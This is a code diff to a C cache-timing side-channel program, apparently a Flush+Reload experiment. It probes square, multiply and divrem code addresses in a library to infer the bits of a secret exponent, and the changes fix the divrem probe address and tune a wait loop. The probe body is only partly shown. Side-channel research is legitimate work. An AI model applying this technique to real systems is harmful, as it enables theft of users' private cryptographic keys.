@@ -31,14 +31,18 @@ int probe(char* addr){
         :"edi","edx"
        
     );
-    //printf("time: %u\n",time);
+    //if(time<150){
+    	//printf("hit\n");
+    //	printf("time: %u\n",time);
+    //}
+   // printf("time: %u\n",time);
 
     
 
     return time < THRESHOLD;
 }
 void busy_wait(){
-    for(int i =0; i<60000; i++){
+    for(int i =0; i<6000; i++){
          asm __volatile__(
         "nop\n\t"
         );
@@ -60,10 +64,11 @@ int main(void){
    int mul_addr = 0x9fd80;
    int divrem_addr = 0x9e57c;
    
-   for(int i=0;i<5000;i++){
+   for(int i=0;i< 5000;i++){
        int sqr = probe(file_addr + sqr_addr);
        int mul = probe(file_addr + mul_addr);
-       int divrem = probe(file_addr + mul_addr);
+       int divrem = probe(file_addr + divrem_addr);
+       
        if(sqr && mul && divrem){
            printf("1");
        }else{
